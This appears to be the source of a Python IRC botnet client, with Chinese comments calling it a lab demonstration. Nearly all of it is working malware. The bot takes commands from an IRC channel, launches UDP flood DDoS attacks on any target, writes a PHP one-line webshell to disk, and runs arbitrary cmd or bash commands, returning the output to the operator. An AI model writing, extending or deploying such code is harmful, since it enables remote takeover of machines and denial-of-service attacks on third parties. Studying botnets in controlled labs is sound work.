import socket
import platform, subprocess
import sys
import time
import random

SERVER = 'ip'
PORT   = port
CHAN   = '#bot'
NICK   = f'bot-{random.randint(1, 9999)}'


def stop_ddos():
    sys_type = platform.system()          # 'Windows' / 'Linux' / 'Darwin'
    if sys_type == 'Windows':
        # 杀所有 python.exe（含子进程）！！！！！！注意靶机运行其他python服务，请自己修改对应命令
        subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/T'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        # Linux / macOS
        subprocess.run(['pkill', '-f', 'scapy'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def irc_send(s, m):
    s.send((m + '\r\n').encode())

def ddos(t, p, spd=500):
    # 启动后台进程进行 UDP 洪水，spd 为速度 1~1000
    subprocess.Popen([
        sys.executable, '-c',
        f'''
import socket,random,time
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1490)
sd={spd}
sent=0
while True:
    sock.sendto(bytes, ("{t}", {p}))
    sent+=1
    print(f"已发送 {{sent}} 个数据包到 {t} 端口 {p}")
    time.sleep((1000-sd)/2000)
'''
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
# 仅演示写入一句话木马，方便对单个主机进行操作
def muma():
    php_code = '<?php @eval($_POST["pass"]); ?>'
    with open('1.php', 'w', encoding='utf-8') as f:
        f.write(php_code)
#新增：任意执行命令,方便操作
def run_cmd(raw: str):
    """
    raw 格式：!cmd dir  或  !bash ls
    """
    try:
        parts = raw.strip().split(maxsplit=1)
        if len(parts) < 2:               # 只打 !cmd / !bash 没给命令
            return "No command given."

        prefix, command = parts
        if platform.system() == "Windows":
            print("in")
            print(prefix)
            print(command)
            if prefix == "!cmd":
                proc = subprocess.run(["cmd.exe", "/c", command],
                                      capture_output=True, text=True, timeout=10)
            else:
                return "Windows: use !cmd <command>"
        else:                            # Linux / macOS
            if prefix == "!bash":
                proc = subprocess.run(["/bin/bash", "-c", command],
                                      capture_output=True, text=True, timeout=10)
            else:
                return "Unix: use !bash <command>"

        out = proc.stdout or proc.stderr or "(no output)"
        return out.strip()[:300]
    except Exception as e:
        return str(e)

#打开本地计算器（仅用于演示远控可执行任意程序）

def open_calc():
    # Windows 平台
    subprocess.Popen(['calc.exe'], shell=True)
    # Linux 可改成 ['gnome-calculator'] 或 ['xcalc']，根据实验系统调整
s = socket.socket()
s.connect((SERVER, PORT))
irc_send(s, f'NICK {NICK}')
irc_send(s, f'USER user 0 * :{NICK}')
irc_send(s, f'JOIN {CHAN}')

while True:
    data = s.recv(4096).decode(errors="ignore")

    for line in data.splitlines():
        print("<<<", line)
        if line.startswith("PING "):  
            irc_send(s, "PONG " + line.split()[1])
        if line.split()[1] == "001":  
            irc_send(s, f"JOIN {CHAN}")
            irc_send(s, f"PRIVMSG {CHAN} :I'm in!")
    if '!hi' in data:
        irc_send(s, f'PRIVMSG {CHAN} :hi')
    if '!calc' in data:
        open_calc()
        irc_send(s, f'PRIVMSG {CHAN} :Calculator launched.')
    if '!muma' in data:
        muma()
        irc_send(s, f'PRIVMSG {CHAN} :muma created.')
    raw = data.split(':', 2)[-1].strip()
    if raw.startswith('!cmd ') or raw.startswith('!bash '):
        reply = run_cmd(raw)
        irc_send(s, f'PRIVMSG {CHAN} :{reply.replace(chr(10), " | ")}')
    if '!ddos' in data:
        print("[DBG] ddos branch entered")
        try:
            payload = data.split(':', 2)[-1].strip()   # "!ddos ip port speed"
            parts = payload.split()
            if len(parts) not in (3, 4):
                print("[DBG] split len error", parts)
                continue
            _, t, p = parts[:3]
            spd = int(parts[3]) if len(parts) == 4 else 500
            print("[DBG] target=", t, "port=", p, "speed=", spd)
            ddos(t, int(p), spd)
            irc_send(s, f'PRIVMSG {CHAN} :DDoS on {t}:{p} speed={spd}')
        except Exception as e:
            print("[DBG] ddos exception:", e)

    if '!stop' in data:
        stop_ddos()
        irc_send(s, f'PRIVMSG {CHAN} :DDoS stopped')
